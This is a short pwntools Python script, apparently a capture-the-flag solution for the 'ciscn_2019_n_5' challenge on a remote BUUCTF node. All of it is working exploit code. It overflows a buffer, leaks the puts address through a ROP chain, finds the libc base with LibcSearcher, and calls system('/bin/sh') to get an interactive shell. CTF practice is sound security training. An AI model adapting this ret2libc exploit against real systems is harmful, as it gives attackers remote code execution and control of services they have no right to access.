from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn',27267)
#p = process("./ciscn_2019_n_5")
context.log_level="debug"
elf=ELF("ciscn_2019_n_5")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=elf.sym["main"]
rdi=0x0000000000400713
ret=0x00000000004004c9
p.sendlineafter("name",b'1')
payload=40*b'a'+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendlineafter("?",payload)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base=puts_addr-libc.dump('puts')
system=libc_base+libc.dump('system')
sh=libc_base+libc.dump('str_bin_sh')
p.sendlineafter("name",b'1')
payload_=40*b'a'+p64(ret)+p64(rdi)+p64(sh)+p64(system)
p.sendlineafter("?",payload_)
p.interactive()




